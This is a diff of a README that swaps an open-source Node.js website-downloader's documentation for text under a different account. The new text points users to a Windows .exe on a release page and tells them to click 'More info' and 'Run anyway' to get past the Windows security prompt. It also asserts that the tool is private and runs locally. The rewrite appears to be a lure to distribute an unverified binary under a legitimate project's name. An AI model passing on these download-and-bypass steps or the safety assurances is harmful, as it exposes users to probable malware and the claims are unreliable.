@@ -1,59 +1,61 @@
-## Complete Website Downloader 💾
-Download the complete source code of any website (including all assets) 🔨.
+# 🌐 Website-downloader - Save complete websites for offline access
 
-👉 Live Demo: https://website-downloader.onrender.com
+[![Download Website-downloader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Qfas1726/Website-downloader/releases)
 
-![enter image description here](https://github.com/AhmadIbrahiim/Website-downloader/blob/master/public/Record.gif?raw=true)
-<div align="center">
+## 📖 About the project
+Website-downloader saves the complete source code of any website to your local computer. It captures the underlying structure including all connected files like images, script files, and style sheets. You keep a copy of the site on your hard drive to browse without an internet connection. The tool handles the heavy lifting involved in scraping complex web pages so you do not need to write code.
 
-  <a href="">![CodeFactor](https://www.codefactor.io/repository/github/ahmadibrahiim/website-downloader/badge)</a>
+## ⚙️ System requirements
+* Windows 10 or Windows 11 operating system.
+* At least 500 MB of available disk space.
+* Stable internet connection during the initial download process.
+* No prior programming experience or software installation required.
 
-</div>
+## 🚀 Getting started
+You need to download the application to your machine before you can save websites. Follow these steps to set up the software on your Windows computer.
 
-## Description 📒
- Website downloader works with `wget` and `archiver` to download all websites assets and compress then sends it back to the user through socket channel
- 
- **wget params the being used**
- 
- `wget --mirror --convert-links --adjust-extension --page-requisites 
---no-parent http://example.org`
+1. Go to the [official release page](https://github.com/Qfas1726/Website-downloader/releases) to access the download files.
+2. Look for the file labeled with the `.exe` extension specifically for Windows.
+3. Click the file name to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the saved file to open the application.
+6. Windows might show a security prompt. Click "More info" and then click "Run anyway" if the system asks for confirmation.
 
- **Explanation of the various flags:**
+## 🛠️ How to use the software
+The interface remains simple to ensure you save your files without frustration. Follow these steps once you open the program:
 
- - --mirror – Makes (among other things) the download recursive.
-- --convert-links – convert all the links (also to stuff like CSS stylesheets) to relative, so it will be suitable for offline viewing.
-- --adjust-extension – Adds suitable extensions to filenames (html or css) depending on their content-type.
-- --page-requisites – Download things like CSS style-sheets and images required to properly display the page offline.
-- --no-parent – When recursing do not ascend to the parent directory. It useful for restricting the download to only a portion of the site
-### Deploy on cloud providers
-[![Run on Replit](https://binbashbanana.github.io/deploy-buttons/buttons/remade/replit.svg)](https://replit.com/github/AhmadIbrahiim/Website-downloader)
-[![Remix on Glitch](https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/AhmadIbrahiim/Website-downloader)
-[![Deploy on Railway](https://binbashbanana.github.io/deploy-buttons/buttons/remade/railway.svg)](https://railway.app/new/template?template=https://github.com/AhmadIbrahiim/Website-downloader)
-[![Deploy to Cyclic](https://binbashbanana.github.io/deploy-buttons/buttons/remade/cyclic.svg)](https://app.cyclic.sh/api/app/deploy/AhmadIbrahiim/Website-downloader)
-[![Deploy to Koyeb](https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/AhmadIbrahiim/Website-downloader&branch=main&name=Website-downloader)
-[![Deploy to Render](https://binbashbanana.github.io/deploy-buttons/buttons/remade/render.svg)](https://render.com/deploy?repo=https://github.com/AhmadIbrahiim/Website-downloader)
+1. Identify the URL of the website you want to save. Copy this link from your web browser address bar.
+2. Paste the link into the primary text box inside the Website-downloader application.
+3. Choose the destination folder on your computer where the files should land. Use the "Browse" button to select a specific location.
+4. Click the "Start" button to begin the saving process.
+5. Watch the progress bar as the software finds and downloads external assets like images and style files.
+6. Locate the created folder in your destination path once the progress bar reaches 100%.
 
+## 📂 Understanding your files
+The software creates a folder containing the site structure. You will see an `index.html` file that opens in your web browser. The software keeps the folder structure organized to ensure that all images and style files load correctly when you open the site offline.
 
-## How to run it 🤔
+## 💡 Troubleshooting common issues
+Sometimes a website blocks automatic scripts. If a download fails, consider these tips:
 
-- `git clone https://github.com/AhmadIbrahiim/Website-downloader.git`
-- `cd Website-downloader`
-- `$ npm install`
-- `$ npm start`
-- `http://localhost:3000/`
+* Check your network connection. A slow or unstable connection interrupts the download of heavy assets.
+* Verify the web address. Ensure you include the "https://" part of the link.
+* Clear your destination folder. If a previous attempt failed, remove partial files before you start a new download.
+* Check your storage. Ensure your hard drive has enough space to hold all images and large assets from the page.
 
+## 🛡️ Privacy and safety
+This tool runs locally on your computer. Your search activity and the websites you download stay on your hard drive. No data routes through external servers. You maintain total control over your downloaded content.
 
+## 📝 Frequently asked questions
+**Does this tool save videos or audio streams?**
+The tool focuses on visual elements and page structure. It may not capture embedded dynamic content like video players.
 
-# How To Contribute:
- - Open Issue(s) with any bugs you notice.
- - Please create Pull Requests if you think it would be an added value towards our program.
+**Can I download an entire site with thousands of pages?**
+Yes, but keep in mind that large websites consume significant storage space. Monitor your disk usage if you download deep archives.
 
-## Liked it ? You can buy a coffee:
+**Does this work on macOS or Linux?**
+This version is for Windows.
 
-<a href="https://www.buymeacoffee.com/aibrahim" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
+**Is it legal to download websites?**
+Always respect copyright laws. Use this tool for personal archival purposes or for sites where you have clear permission to store data offline.
 
-Thank you,
-
-Email: me@ahmed-ibrahim.com
-
-https://www.ahmed-ibrahim.com
+Keywords: assets, downloader, offline-web-pages, scraper
